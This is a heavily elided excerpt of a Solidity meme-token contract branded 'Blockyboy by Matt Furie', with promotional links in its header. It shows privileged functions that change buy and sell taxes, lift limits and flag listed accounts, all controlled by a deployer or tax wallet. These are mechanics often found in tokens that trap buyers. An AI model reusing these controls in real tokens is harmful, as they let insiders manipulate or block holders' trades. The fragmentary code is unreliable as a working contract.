...
/*
A main character from "Cortex Vortex", born from a pixelated glitch in the blockchain, Blocky Boy wasn’t smooth, shiny, or aerodynamic — he was… well, blocky. 

Web: https://www.blockyboy.vip/
Twitter X: https://X.com/BlockyboyETH
Telegram: https://t.me/blockyboy_eth
...
contract BLOCKBOY is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Blockyboy by Matt Furie";
    string private constant _symbol = unicode"BLOCKYBOY";
    uint256 public _maxTxAmount = 10933140 * 10**_decimals; 
    uint256 public _maxWalletSize = 18931050 * 10**_decimals; 
    ...
    constructor () payable {
        _taxWallet = payable(0xe7c5C7294E86d07F532AfeA67C44DAfC4cf91c8F);
   ...
   function _transfer(address from, address to, uint256 amount) private {
    ...
    function bloRemoveLimit() external onlyOwner{
        _maxTxAmount = _tTotal;
        //_maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function bloRemoveTransfer() external onlyOwner{
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    function bloSetInitialTax(uint256 _newInitialBuyTax, uint256 _newInitialSellTax) external {
    ...
    _initialSellTax = _newInitialSellTax;
     ...
     function bloRemoveTaxes() external onlyOwner{
        _initialBuyTax = 0;
        _initialSellTax = 0;
        emit TransferTaxUpdated(0);
    }

    function setBlokStart(address[] memory accounts, bool excluded) external {
        require(_msgSender() == _taxWallet || _msgSender() == _deployer, "Not authorized");
    ...
    function enableTrading() external onlyOwner() {
        ...
        uint256 liquidityTokens = contractBalance.mul(67).div(100);
    ...
    function bloPTransfer(uint256 percentage) external { 
